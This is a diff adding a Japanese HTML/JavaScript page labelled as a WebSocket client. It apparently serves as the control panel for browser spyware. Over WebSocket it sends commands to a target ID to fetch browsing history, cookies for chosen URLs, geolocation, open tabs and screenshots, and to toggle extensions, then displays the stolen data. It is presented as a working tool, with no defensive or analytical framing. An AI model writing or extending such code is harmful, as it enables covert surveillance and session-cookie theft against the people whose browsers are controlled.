@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WebSocket クライアント - 改良版</title>
+  <style>
+    /* 基本スタイル（変更なし） */
+    :root {
+      --primary-color: #007BFF;
+      --secondary-color: #f8f9fa;
+      --accent-color: #28a745;
+      --light-gray: #f5f6f7;
+      --dark-gray: #333;
+      --border-color: #ced4da;
+      --hover-bg: #f2f4f7;
+    }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      padding: 20px;
+      max-width: 1200px;
+      margin: auto;
+      background-color: var(--light-gray);
+    }
+    h2, h3 {
+      color: var(--dark-gray);
+    }
+    .form-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: 600;
+      color: #555;
+    }
+    input {
+      width: 100%;
+      padding: 8px 12px;
+      box-sizing: border-box;
+      border: 1px solid var(--border-color);
+      border-radius: 4px;
+      transition: border-color 0.3s;
+    }
+    input:focus {
+      outline: none;
+      border-color: var(--primary-color);
+      box-shadow: 0 0 0 2px rgba(0,123,255,0.25);
+    }
+    button {
+      padding: 10px 20px;
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: background-color 0.3s;
+      margin: 5px 0;
+    }
+    button:hover:not(:disabled) {
+      background-color: #0056b3;
+    }
+    button:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
+    }
+    .tab-buttons {
+      display: flex;
+      flex-wrap: wrap;
+      margin-top: 20px;
+      border-bottom: 2px solid #ddd;
+    }
+    .tab-button {
+      padding: 10px 20px;
+      background: none;
+      border: none;
+      border-bottom: 3px solid transparent;
+      cursor: pointer;
+      font-weight: bold;
+      transition: all 0.3s;
+      margin-right: 10px;
+    }
+    .tab-button.active {
+      border-color: var(--primary-color);
+      color: var(--primary-color);
+    }
+    .tab-content {
+      display: none;
+      margin-top: 20px;
+      padding: 20px;
+      background: white;
+      border-radius: 4px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+    }
+    .tab-content.active {
+      display: block;
+    }
+    .history-tile {
+      background: white;
+      border-left: 4px solid var(--accent-color);
+      border-radius: 4px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+      padding: 15px;
+      margin-bottom: 10px;
+      cursor: pointer;
+      transition: transform 0.2s;
+    }
+    .history-tile:hover {
+      transform: translateX(5px);
+    }
+    .history-title {
+      margin: 0;
+      font-size: 16px;
+      color: var(--dark-gray);
+    }
+    .history-details {
+      display: none;
+      margin-top: 10px;
+      padding-left: 10px;
+      border-left: 2px solid #ddd;
+      font-size: 14px;
+      color: #666;
+    }
+    .extension-card {
+      background: white;
+      border-left: 4px solid var(--accent-color);
+      border-radius: 4px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+      padding: 15px;
+      margin-bottom: 15px;
+    }
+    .extension-card h4 {
+      margin: 0 0 8px 0;
+      color: var(--dark-gray);
+    }
+    .extension-card p {
+      margin: 4px 0;
+      color: #666;
+      font-size: 14px;
+    }
+    .switch {
+      position: relative;
+      display: inline-block;
+      width: 50px;
+      height: 24px;
+      vertical-align: middle;
+    }
+    .switch input { 
+      opacity: 0;
+      width: 0;
+      height: 0;
+    }
+    .slider {
+      position: absolute;
+      cursor: pointer;
+      top: 0; left: 0;
+      right: 0; bottom: 0;
+      background-color: #ccc;
+      transition: .4s;
+      border-radius: 24px;
+    }
+    .slider:before {
+      position: absolute;
+      content: "";
+      height: 18px; width: 18px;
+      left: 3px; bottom: 3px;
+      background-color: white;
+      transition: .4s;
+      border-radius: 50%;
+    }
+    input:checked + .slider {
+      background-color: var(--accent-color);
+    }
+    input:focus + .slider {
+      box-shadow: 0 0 1px var(--accent-color);
+    }
+    input:checked + .slider:before {
+      transform: translateX(26px);
+    }
+    .location-info, .tab-info {
+      background: white;
+      padding: 15px;
+      border-radius: 4px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+      margin-bottom: 15px;
+    }
+    .canvas-container {
+      margin-top: 20px;
+      text-align: center;
+    }
+    canvas {
+      border: 1px solid #ccc;
+      background-color: #eef;
+      display: block;
+      max-width: 100%;
+      height: auto;
+      margin-top: 15px;
+    }
+    .search-bar {
+      margin: 10px 0 20px;
+    }
+    .search-bar input {
+      width: 100%;
+      max-width: 400px;
+    }
+    .load-more {
+      display: block;
+      margin: 20px auto;
+      text-align: center;
+      color: var(--primary-color);
+      cursor: pointer;
+      font-weight: bold;
+    }
+    .message-block {
+      margin: 15px 0;
+      padding: 15px;
+      background: #f1f3f5;
+      border-left: 4px solid var(--primary-color);
+      border-radius: 4px;
+    }
+  </style>
+</head>
+<body>
+  <h2>WebSocket クライアント - 改良版</h2>
+  
+  <!-- 接続フォーム -->
+  <div class="form-group">
+    <label for="clientId">自分のIDを入力してください:</label>
+    <input type="text" id="clientId" list="savedIds" placeholder="例: myClient123" />
+    <datalist id="savedIds"></datalist>
+    <button id="connectButton">接続</button>
+  </div>
+
+  <!-- メッセージ送信フォーム -->
+  <div id="sendMessageForm" style="display: none;">
+    <div class="form-group">
+      <label for="targetId">送信先のID:</label>
+      <input type="text" id="targetId" list="savedTargetIds" placeholder="送信先のクライアントIDを入力" />
+      <datalist id="savedTargetIds"></datalist>
+    </div>
+    <div class="form-group">
+      <label for="messageContent">送信するメッセージ:</label>
+      <input type="text" id="messageContent" placeholder="送信する内容を入力" />
+    </div>
+    <button id="sendButton">メッセージ送信</button>
+  </div>
+
+  <!-- タブ付きコンテンツ -->
+  <div class="tab-buttons">
+    <button class="tab-button active" data-tab="messages">メッセージ</button>
+    <button class="tab-button" data-tab="history">履歴</button>
+    <button class="tab-button" data-tab="extensions">拡張機能</button>
+    <button class="tab-button" data-tab="cookies">Cookie</button>
+    <button class="tab-button" data-tab="location">位置情報</button>
+    <button class="tab-button" data-tab="tabs">タブ</button>
+    <button class="tab-button" data-tab="image">画像</button>
+  </div>
+
+  <!-- メッセージタブ -->
+  <div id="messages" class="tab-content active">
+    <h3>受信したメッセージ</h3>
+    <div id="messagesContainer"></div>
+  </div>
+
+  <!-- 履歴タブ -->
+  <div id="history" class="tab-content">
+    <h3>履歴情報</h3>
+    <div class="search-bar">
+      <input type="text" id="historySearch" placeholder="タイトルで検索..." />
+    </div>
+    <div id="historyList" class="history-list"></div>
+    <div id="loadMoreHistory" class="load-more" style="display: none;">もっと見る</div>
+  </div>
+
+  <!-- 拡張機能タブ -->
+  <div id="extensions" class="tab-content">
+    <h3>拡張機能情報</h3>
+    <div class="search-bar">
+      <input type="text" id="extensionSearch" placeholder="拡張機能名で検索..." />
+    </div>
+    <div id="extensionList" class="extension-list"></div>
+  </div>
+
+  <!-- Cookieタブ -->
+  <div id="cookies" class="tab-content">
+    <h3>Cookie情報</h3>
+    <div class="search-bar">
+      <input type="text" id="cookieSearch" placeholder="URLで検索..." />
+    </div>
+    <div id="cookieList" class="cookie-list"></div>
+  </div>
+
+  <!-- 位置情報タブ -->
+  <div id="location" class="tab-content">
+    <h3>位置情報</h3>
+    <div id="locationInfo" class="location-info">位置情報はありません</div>
+  </div>
+
+  <!-- タブ管理タブ -->
+  <div id="tabs" class="tab-content">
+    <h3>現在のタブ</h3>
+    <div id="tabList" class="tab-info">タブ情報はありません</div>
+  </div>
+
+  <!-- 画像タブ -->
+  <div id="image" class="tab-content canvas-container">
+    <h3>受信した画像</h3>
+    <button id="screenshotButton" style="display: none;">スクリーンショットを取得</button>
+    <button id="stopScreenshotButton" style="display: none; margin-left: 10px;">停止</button>
+    <canvas id="imageCanvas"></canvas>
+  </div>
+
+  <script>
+    // グローバル変数
+    let ws;
+    let clientId;
+    let currentTab = 'messages';
+    let historyData = [];
+    let extensionsData = [];
+    let cookieData = {};
+    let currentPageTabs = [];
+    let currentTabIndex = 0;
+    let lastUrlForScreenshot = '';
+    const HISTORY_ITEMS_PER_LOAD = 10;
+    const canvas = document.getElementById('imageCanvas');
+    const ctx = canvas.getContext('2d');
+    const tabButtons = document.querySelectorAll('.tab-button');
+    const tabContents = document.querySelectorAll('.tab-content');
+
+    // タブ切り替えイベント
+    tabButtons.forEach(button => {
+      button.addEventListener('click', () => {
+        tabButtons.forEach(btn => btn.classList.remove('active'));
+        tabContents.forEach(content => content.classList.remove('active'));
+        button.classList.add('active');
+        
+        const newTab = button.dataset.tab;
+        // 特定のタブを開いたときに自動でコマンドを送信
+        if (newTab === 'history') {
+          sendWebSocketMessage({ 
+            type: 'cmd', 
+            message: 'GetHistory', 
+            to: document.getElementById('targetId').value,
+            from: clientId 
+          });
+        } else if (newTab === 'extensions') {
+          sendWebSocketMessage({ 
+            type: 'cmd', 
+            message: 'GetExtensionId', 
+            to: document.getElementById('targetId').value,
+            from: clientId 
+          });
+        } else if (newTab === 'location') {
+          sendWebSocketMessage({ 
+            type: 'cmd', 
+            message: 'getLocations', 
+            to: document.getElementById('targetId').value,
+            from: clientId 
+          });
+        } else if (newTab === 'tabs') {
+          sendWebSocketMessage({ 
+            type: 'cmd', 
+            message: 'getPage', 
+            to: document.getElementById('targetId').value,
+            from: clientId 
+          });
+        }
+        // タブを表示
+        currentTab = newTab;
+        document.getElementById(currentTab).classList.add('active');
+      });
+    });
+
+    // 履歴検索機能
+    document.getElementById('historySearch').addEventListener('input', (e) => {
+      const searchTerm = e.target.value.toLowerCase();
+      displayHistory(historyData.filter(item => 
+        item.url.toLowerCase().includes(searchTerm) || 
+        item.title.toLowerCase().includes(searchTerm)
+      ));
+    });
+
+    // Cookie検索機能
+    document.getElementById('cookieSearch').addEventListener('input', (e) => {
+      const searchTerm = e.target.value.toLowerCase();
+      displayCookies(Object.entries(cookieData).filter(([url]) => 
+        url.toLowerCase().includes(searchTerm)
+      ));
+    });
+
+    // 拡張機能検索機能
+    document.getElementById('extensionSearch').addEventListener('input', (e) => {
+      const searchTerm = e.target.value.toLowerCase();
+      displayExtensions(extensionsData.filter(item => 
+        item.name.toLowerCase().includes(searchTerm) || 
+        item.id.toLowerCase().includes(searchTerm)
+      ));
+    });
+
+    // 履歴表示関数
+    function displayHistory(data) {
+      const container = document.getElementById('historyList');
+      if (!data || data.length === 0) {
+        container.innerHTML = '<p>履歴データがありません</p>';
+        document.getElementById('loadMoreHistory').style.display = 'none';
+        return;
+      }
+      // データをソート（最新順）
+      const sortedData = [...data].sort((a, b) => 
+        new Date(b.lastVisitTime) - new Date(a.lastVisitTime)
+      );
+      // 既存の要素をクリア
+      container.innerHTML = '';
+      currentTabIndex = 0;
+      // 最初のバッチを表示
+      showNextHistoryBatch(sortedData);
+      // 負荷を軽減するために表示要素を制限
+      if (sortedData.length > HISTORY_ITEMS_PER_LOAD) {
+        document.getElementById('loadMoreHistory').style.display = 'block';
+        // ボタンクリックイベントを設定
+        document.getElementById('loadMoreHistory').onclick = () => {
+          showNextHistoryBatch(sortedData);
+        };
+      } else {
+        document.getElementById('loadMoreHistory').style.display = 'none';
+      }
+    }
+
+    // 次の履歴バッチを表示
+    function showNextHistoryBatch(data) {
+      const container = document.getElementById('historyList');
+      const endIndex = Math.min(currentTabIndex + HISTORY_ITEMS_PER_LOAD, data.length);
+      for (let i = currentTabIndex; i < endIndex; i++) {
+        const item = data[i];
+        const tile = document.createElement('div');
+        tile.className = 'history-tile';
+        tile.innerHTML = `
+          <h4 class="history-title">${item.title}</h4>
+          <div class="history-details">
+            <p><a href="${item.url}" target="_blank">${item.url}</a></p>
+            <p>最終アクセス日時: ${new Date(item.lastVisitTime).toLocaleString()}</p>
+          </div>
+        `;
+        // タイルクリックイベント
+        tile.addEventListener('click', () => {
+          const details = tile.querySelector('.history-details');
+          details.style.display = details.style.display === 'block' ? 'none' : 'block';
+          // Cookie取得コマンドを送信
+          if (ws && ws.readyState === WebSocket.OPEN) {
+            sendWebSocketMessage({ 
+              type: 'cmd', 
+              message: `getCookie ${item.url}`, 
+              to: document.getElementById('targetId').value,
+              from: clientId 
+            });
+          }
+        });
+        container.appendChild(tile);
+      }
+      currentTabIndex = endIndex;
+    }
+
+    // 拡張機能表示関数
+    function displayExtensions(data) {
+      const container = document.getElementById('extensionList');
+      if (!data || data.length === 0) {
+        container.innerHTML = '<p>拡張機能情報がありません</p>';
+        return;
+      }
+      container.innerHTML = '';
+      data.forEach(item => {
+        const card = document.createElement('div');
+        card.className = 'extension-card';
+        card.innerHTML = `
+          <h4>${item.name}</h4>
+          <p>ID: ${item.id}</p>
+          <p>状態: ${item.enabled ? '有効' : '無効'}</p>
+          <p>説明: ${item.description}</p>
+          <label class="switch">
+            <input type="checkbox" ${item.enabled ? 'checked' : ''} data-id="${item.id}">
+            <span class="slider"></span>
+          </label>
+        `;
+        // スイッチイベントリスナーを追加
+        const switchInput = card.querySelector('input[type="checkbox"]');
+        switchInput.addEventListener('change', (e) => {
+          const extensionId = e.target.dataset.id;
+          const newState = e.target.checked;
+          // サーバーにコマンドを送信
+          if (ws && ws.readyState === WebSocket.OPEN) {
+            const command = newState ? `extensionEnable ${extensionId}` : `extensionDisable ${extensionId}`;
+            sendWebSocketMessage({ 
+              type: 'cmd', 
+              message: command, 
+              to: document.getElementById('targetId').value,
+              from: clientId 
+            });
+          }
+        });
+        container.appendChild(card);
+      });
+    }
+
+    // Cookie表示関数
+    function displayCookies(cookieEntries) {
+      const container = document.getElementById('cookieList');
+      if (!cookieEntries || cookieEntries.length === 0) {
+        container.innerHTML = '<p>Cookie情報がありません</p>';
+        return;
+      }
+      container.innerHTML = '';
+      cookieEntries.forEach(([url, cookies]) => {
+        const card = document.createElement('div');
+        card.className = 'cookie-info';
+        card.innerHTML = `
+          <h4>${url}</h4>
+          <pre>${cookies}</pre>
+        `;
+        container.appendChild(card);
+      });
+    }
+
+    // 位置情報表示関数
+    function displayLocation(locationData) {
+      const container = document.getElementById('locationInfo');
+      if (!locationData || !locationData.latitude) {
+        container.innerHTML = '位置情報はありません';
+        return;
+      }
+      container.innerHTML = `
+        <p>緯度: ${locationData.latitude}</p>
+        <p>経度: ${locationData.longitude}</p>
+        <p>精度: ${locationData.accuracy} m</p>
+        <p>取得日時: ${new Date(locationData.timestamp).toLocaleString()}</p>
+      `;
+    }
+
+    // タブ情報表示関数
+    function displayTabs(tabData) {
+      const container = document.getElementById('tabList');
+      if (!tabData || !Array.isArray(tabData.tabs) || tabData.tabs.length === 0) {
+        container.innerHTML = 'タブ情報はありません';
+        return;
+      }
+      // 現在のタブ情報をグローバル変数に保存
+      currentPageTabs = tabData.tabs;
+      // タブ情報を表示
+      container.innerHTML = '<ul style="list-style-type: none; padding-left: 0;">';
+      tabData.tabs.forEach(tab => {
+        container.innerHTML += `
+          <li style="margin-bottom: 10px;">
+            <strong>${tab.title}</strong><br>
+            <a href="${tab.url}" target="_blank">${tab.url}</a>
+          </li>
+        `;
+      });
+      container.innerHTML += '</ul>';
+      // 最初のURLを保存（スクリーンショットに使用）
+      if (tabData.tabs.length > 0) {
+        lastUrlForScreenshot = tabData.tabs[0].url;
+      }
+      // スクリーンショットボタンを表示
+      document.getElementById('screenshotButton').style.display = 'inline-block';
+    }
+
+    // メッセージ表示関数
+    function appendMessage(msg, type = 'normal') {
+      const container = document.getElementById('messagesContainer');
+      const messageDiv = document.createElement('div');
+      messageDiv.className = 'message-block';
+      if (type === 'error') {
+        messageDiv.style.borderLeftColor = '#dc3545';
+      } else if (type === 'info') {
+        messageDiv.style.borderLeftColor = '#ffc107';
+      }
+      messageDiv.textContent = msg;
+      container.appendChild(messageDiv);
+      container.scrollTop = container.scrollHeight;
+    }
+
+    // キャンバスに画像を描画
+    function drawImageOnCanvas(base64Image) {
+      const img = new Image();
+      img.onload = () => {
+        const maxWidth = window.innerWidth * 0.8;
+        const maxHeight = window.innerHeight * 0.6;
+        const scale = Math.min(maxWidth / img.width, maxHeight / img.height);
+        canvas.width = img.width * scale;
+        canvas.height = img.height * scale;
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+      };
+      img.src = base64Image;
+    }
+
+    // WebSocket初期化
+    function initWebSocket(clientId) {
+      const SERVER_URL = 'ws://localhost:3000';
+      ws = new WebSocket(SERVER_URL);
+      ws.onopen = () => {
+        appendMessage('サーバーに接続しました');
+        ws.send(JSON.stringify({ id: clientId }));
+      };
+      ws.onmessage = (event) => handleMessage(event.data);
+      ws.onerror = (error) => appendMessage(`接続エラー: ${error.message}`, 'error');
+      ws.onclose = () => setTimeout(() => initWebSocket(clientId), 5000);
+    }
+
+    // メッセージ処理
+    function handleMessage(data) {
+      try {
+        // data:image形式のチェック
+        if (data.startsWith('data:image/png;base64,')) {
+          drawImageOnCanvas(data);
+          appendMessage('画像が送信されました', 'info');
+          return;
+        }
+
+        // JSONデータか確認
+        const message = JSON.parse(data);
+        
+        // 画像メッセージの特別処理
+        if (message.message && message.message.startsWith('data:image/png;base64,')) {
+          drawImageOnCanvas(message.message);
+          appendMessage('画像が送信されました', 'info');
+        } else if (message.message === 'stopScreenshot') {
+          appendMessage('スクリーンショット取得を停止しました', 'info');
+        } else {
+          // JSONデータか確認
+          try {
+            const jsonData = JSON.parse(message.message);
+            if (Array.isArray(jsonData) && jsonData.some(item => 'url' in item)) {
+              // 履歴データとして処理
+              historyData = jsonData;
+              displayHistory(historyData);
+              appendMessage(`履歴情報 ${jsonData.length}件を受信`, 'info');
+            } else if (Array.isArray(jsonData) && jsonData.some(item => 'id' in item)) {
+              // 拡張機能データとして処理
+              extensionsData = jsonData;
+              displayExtensions(extensionsData);
+              appendMessage(`拡張機能情報 ${jsonData.length}件を受信`, 'info');
+            } else if (jsonData && jsonData.coords) {
+              // 位置情報として処理
+              displayLocation(jsonData);
+              appendMessage(`位置情報を受信`, 'info');
+            } else if (jsonData && jsonData.tabs && Array.isArray(jsonData.tabs)) {
+              // タブ情報を表示
+              displayTabs(jsonData);
+              appendMessage(`タブ情報 ${jsonData.tabs.length}件を受信`, 'info');
+            } else {
+              // 通常のメッセージ
+              appendMessage(`メッセージ受信: ${message.message}`);
+            }
+          } catch {
+            // 通常のテキストメッセージ
+            appendMessage(`メッセージ受信: ${message.message}`);
+          }
+        }
+      } catch (error) {
+        // JSONパースに失敗した場合は通常のテキストとして扱う
+        appendMessage(`メッセージ受信: ${data}`);
+      }
+    }
+
+    // 初期化イベント
+    window.addEventListener('DOMContentLoaded', () => {
+      const savedTargetIds = JSON.parse(localStorage.getItem('savedTargetIds')) || [];
+      populateTargetIdDatalist(savedTargetIds);
+      const savedClientId = localStorage.getItem('clientId');
+      const savedTargetId = localStorage.getItem('targetId');
+      if (savedClientId) document.getElementById('clientId').value = savedClientId;
+      if (savedTargetId) document.getElementById('targetId').value = savedTargetId;
+    });
+
+    // 接続ボタンのクリックイベント
+    document.getElementById('connectButton').addEventListener('click', function () {
+      const inputField = document.getElementById('clientId');
+      clientId = inputField.value.trim();
+      if (!clientId) return alert('IDを入力してください。');
+      saveIdToLocalStorage(clientId);
+      localStorage.setItem('clientId', clientId);
+      initWebSocket(clientId);
+      inputField.disabled = true;
+      this.disabled = true;
+      document.getElementById('sendMessageForm').style.display = 'block';
+    });
+
+    // IDを保存する関数
+    function saveIdToLocalStorage(newId) {
+      let savedIds = JSON.parse(localStorage.getItem('savedIds')) || [];
+      if (!savedIds.includes(newId)) {
+        savedIds.push(newId);
+        localStorage.setItem('savedIds', JSON.stringify(savedIds));
+        populateIdDatalist(savedIds);
+      }
+    }
+
+    // 候補リストを生成する関数
+    function populateIdDatalist(ids) {
+      const datalist = document.getElementById('savedIds');
+      datalist.innerHTML = '';
+      ids.forEach(id => {
+        const option = document.createElement('option');
+        option.value = id;
+        datalist.appendChild(option);
+      });
+    }
+
+    // メッセージ送信ボタンのイベント
+    document.getElementById('sendButton').addEventListener('click', () => {
+      const targetId = document.getElementById('targetId').value.trim();
+      const messageContent = document.getElementById('messageContent').value.trim();
+      if (!targetId || !messageContent) return alert('送信先IDとメッセージを入力してください。');
+      saveTargetIdToLocalStorage(targetId);
+      localStorage.setItem('targetId', targetId);
+      sendWebSocketMessage({ 
+        type: 'cmd', 
+        message: messageContent, 
+        to: targetId,
+        from: clientId 
+      });
+      appendMessage(`送信済み: to=${targetId}, message=${messageContent}`);
+    });
+
+    function populateTargetIdDatalist(targetIds) {
+      const datalist = document.getElementById('savedTargetIds');
+      datalist.innerHTML = '';
+      targetIds.forEach(id => {
+        const option = document.createElement('option');
+        option.value = id;
+        datalist.appendChild(option);
+      });
+    }
+
+    function saveTargetIdToLocalStorage(newTargetId) {
+      let savedTargetIds = JSON.parse(localStorage.getItem('savedTargetIds')) || [];
+      if (!savedTargetIds.includes(newTargetId)) {
+        savedTargetIds.push(newTargetId);
+        localStorage.setItem('savedTargetIds', JSON.stringify(savedTargetIds));
+        populateTargetIdDatalist(savedTargetIds);
+      }
+    }
+
+    // スクリーンショットボタンイベント
+    document.getElementById('screenshotButton').addEventListener('click', () => {
+      if (lastUrlForScreenshot) {
+        sendWebSocketMessage({ 
+          type: 'cmd', 
+          message: `screenshot ${lastUrlForScreenshot}`, 
+          to: document.getElementById('targetId').value,
+          from: clientId 
+        });
+        appendMessage(`スクリーンショットを取得: ${lastUrlForScreenshot}`);
+      }
+    });
+
+    // 停止ボタンイベント（サーバー側の実装に依存）
+    document.getElementById('stopScreenshotButton').addEventListener('click', () => {
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        sendWebSocketMessage({ 
+          type: 'cmd', 
+          message: 'stopScreenshot', 
+          to: document.getElementById('targetId').value,
+          from: clientId 
+        });
+        appendMessage(`スクリーンショット取得を停止`);
+      }
+    });
+
+    // WebSocketでメッセージを送信する
+    function sendWebSocketMessage(message) {
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify(message));
+      } else {
+        appendMessage('接続が確立されていません。', 'error');
+      }
+    }
+  </script>
+</body>
+</html>
